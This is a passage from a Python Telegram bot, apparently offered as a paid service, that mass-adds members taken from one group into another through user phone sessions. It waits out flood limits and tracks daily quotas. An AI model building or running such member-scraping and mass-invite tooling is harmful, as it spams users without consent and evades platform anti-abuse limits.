                client = TelegramClient(f'task_{user_id}_{phone}', API_ID, API_HASH)
                await client.start()
                
                await client(InviteToChannelRequest(target_entity, [member.id]))
                total_added += 1
                
                add_group_member_record(
                    target_group_id,
                    target,
                    member.id,
                    member.username or 'NoUsername',
                    member.first_name or 'Unknown',
                    user_id
                )
                
                if i % 10 == 0:
                    await event.reply(f"✅ [{i}/{total_members}] Added: {member.first_name}")
                
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
                total_failed += 1
                
            except Exception as e:
                total_failed += 1
                if "USER_ALREADY_PARTICIPANT" in str(e):
                    total_skipped += 1
                    add_group_member_record(
                        target_group_id,
                        target,
                        member.id,
                        member.username or 'NoUsername',
                        member.first_name or 'Unknown',
                        user_id
                    )
            
            await asyncio.sleep(1)
        
        today = datetime.now().strftime("%Y-%m-%d")
        update_daily_usage(user_id, today, adds=total_added)
        update_user_stats(user_id, adds=total_added, groups=1)
        
        log_activity(user_id, "add_completed", f"Added {total_added} members to {target}")
        
        if user_id in active_tasks:
            del active_tasks[user_id]
        
        await event.reply(f"""
✅ **Add Task Completed!**

📊 Results:
✅ Added: {total_added}
⏭️ Skipped: {total_skipped}
❌ Failed: {total_failed}
📌 Source: {source}
🎯 Target: {target}

📈 Total added in this group: {get_group_adds_count(user_id, target_group_id)}
""")
        
    except Exception as e:
        if user_id in active_tasks:
            del active_tasks[user_id]
        await event.reply(f"❌ Task error: {str(e)[:200]}")

# ============================================================
# ============================================================
# 🔄 DAILY RESET
# ============================================================
# ============================================================

async def daily_reset():
    while True:
        now = datetime.now()
        next_midnight = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0)
        wait_seconds = (next_midnight - now).total_seconds()
        await asyncio.sleep(wait_seconds)
        
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("DELETE FROM daily_usage WHERE date < ?", (datetime.now().strftime("%Y-%m-%d"),))
        conn.commit()
        conn.close()
        
        print("✅ Daily limits reset!")

# ============================================================
# ============================================================
# 🏃 MAIN FUNCTION
# ============================================================
# ============================================================

async def main():
    init_db()
    
    # Clear screen
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print("="*60)
    print("🤖 TELEGRAM AUTO BOT SAAS - COMPLETE ADMIN PANEL")
    print("="*60)
    print(f"📌 Bot: @{bot.me.username}")
    print(f"👑 Admins: {len(get_all_admins())}")
    print(f"📱 Platform: {platform.system()} {platform.release()}")
    print("="*60)
    print("\n✅ Bot is running! Press Ctrl+C to stop.\n")
    
    asyncio.create_task(daily_reset())
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n⏹️ Bot stopped!")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        sys.exit(1)